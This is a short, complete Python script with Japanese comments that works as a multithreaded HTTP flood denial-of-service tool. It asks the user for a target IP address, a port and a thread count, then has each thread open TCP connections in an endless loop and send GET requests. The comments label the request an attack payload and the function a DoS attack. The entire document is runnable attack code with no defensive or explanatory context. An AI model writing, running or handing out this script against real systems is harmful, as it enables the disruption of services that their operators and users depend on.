import socket
import threading

# ユーザーからターゲットのIPとポートを入力
target_ip = input("ターゲットのIPアドレスを入力してください: ")
target_port = int(input("ターゲットのポート番号を入力してください (例: 80): "))

# 攻撃用HTTPリクエストのペイロード
payload = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"

def Dos_attack():
    while True:
        try:
            # ソケット接続を作成
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendall(payload)
            s.close()
        except Exception as e:
            print(f"エラー: {e}")

# スレッド数を指定して攻撃を開始
num_threads = int(input("使用するスレッド数を入力してください (例: 100): "))
for i in range(num_threads):
    thread = threading.Thread(target=Dos_attack)
    thread.start()
